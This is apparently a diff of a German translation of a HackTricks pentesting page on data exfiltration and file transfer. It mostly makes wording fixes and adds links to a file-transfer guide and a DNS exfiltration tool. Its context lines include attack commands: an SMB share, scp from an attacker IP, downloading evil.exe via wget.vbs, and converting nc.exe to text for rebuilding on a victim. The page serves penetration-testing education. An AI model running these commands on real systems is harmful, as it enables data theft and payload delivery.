@@ -2,9 +2,9 @@
 
 {{#include ../banners/hacktricks-training.md}}
 
-## Häufig genehmigte Domains zum Exfiltrieren von Informationen
+## Häufig auf die Whitelist gesetzte Domains zum Exfiltrieren von Informationen
 
-Überprüfen Sie [https://lots-project.com/](https://lots-project.com/), um häufig genehmigte Domains zu finden, die missbraucht werden können
+Überprüfen Sie [https://lots-project.com/](https://lots-project.com/), um häufig auf die Whitelist gesetzte Domains zu finden, die missbraucht werden können
 
 ## Copy\&Paste Base64
 
@@ -150,7 +150,7 @@ kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-Oder erstellen Sie einen SMB-Share **mit Samba**:
+Oder erstellen Sie einen SMB-Freigabe **mit Samba**:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -181,7 +181,7 @@ scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-Wenn das Opfer SSH hat, kann der Angreifer ein Verzeichnis vom Opfer zum Angreifer einbinden.
+Wenn das Opfer SSH hat, kann der Angreifer ein Verzeichnis vom Opfer zum Angreifer einhängen.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -296,7 +296,7 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Das `debug.exe` Programm ermöglicht nicht nur die Inspektion von Binaries, sondern hat auch die **Fähigkeit, sie aus Hex zu rekonstruieren**. Das bedeutet, dass `debug.exe` die Binärdatei generieren kann, indem man ein Hex eines Binaries bereitstellt. Es ist jedoch wichtig zu beachten, dass debug.exe eine **Einschränkung hat, Dateien bis zu 64 kb Größe zu assemblieren**.
+Das `debug.exe` Programm ermöglicht nicht nur die Inspektion von Binaries, sondern hat auch die **Fähigkeit, sie aus Hex zu rekonstruieren**. Das bedeutet, dass durch die Bereitstellung eines Hex eines Binaries `debug.exe` die Binärdatei generieren kann. Es ist jedoch wichtig zu beachten, dass debug.exe eine **Einschränkung hat, Dateien bis zu 64 kb Größe zusammenzustellen**.
 ```bash
 # Reduce the size
 upx -9 nc.exe
@@ -304,6 +304,10 @@ wine exe2bat.exe nc.exe nc.txt
 ```
 Dann fügen Sie den Text in die Windows-Shell ein, und eine Datei namens nc.exe wird erstellt.
 
+- [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
+
 ## DNS
+
+- [https://github.com/Stratiz/DNS-Exfil](https://github.com/Stratiz/DNS-Exfil)
 
 {{#include ../banners/hacktricks-training.md}}
